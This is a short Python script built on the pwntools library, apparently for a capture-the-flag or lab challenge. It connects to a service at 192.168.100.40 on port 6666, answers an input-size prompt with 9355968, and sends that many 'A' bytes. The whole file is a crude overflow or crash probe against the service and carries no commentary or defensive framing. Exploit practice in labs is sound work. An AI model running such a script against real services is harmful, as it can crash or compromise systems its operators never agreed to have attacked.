from pwn import *
p=remote('192.168.100.40',6666)
p.recvuntil(b'Your input size: ')
p.sendline(b'9355968')
payload=b'A'*9355968
p.sendline(payload)